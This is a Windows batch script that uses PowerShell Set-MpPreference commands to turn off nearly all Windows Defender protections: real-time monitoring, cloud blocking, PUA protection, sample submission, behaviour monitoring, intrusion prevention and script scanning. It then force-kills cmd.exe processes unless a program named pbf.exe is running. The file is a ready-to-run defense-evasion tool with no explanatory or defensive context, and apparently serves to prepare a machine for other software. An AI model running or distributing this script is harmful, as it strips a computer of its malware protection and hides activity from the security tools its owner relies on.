@echo off
echo Disabling all Windows Defender protection...

:: Disable Real-time Protection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Disable Cloud-Delivered Protection
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"

:: Disable Potentially Unwanted App (PUA) Protection
powershell -Command "Set-MpPreference -PUAProtection $false"

:: Disable Automatic Sample Submission
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"

:: Disable Microsoft Defender Antivirus
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"

:: Check if pbf.exe is running
tasklist /FI "IMAGENAME eq pbf.exe" 2>NUL | find /I "pbf.exe" >NUL
if %ERRORLEVEL%==0 (
    echo pbf.exe is running, will not kill cmd.exe.
) else (
    echo pbf.exe is not running, killing current cmd.exe...
    taskkill /f /im cmd.exe
)

:: End the batch script (this will also close the command prompt if not skipped)
exit
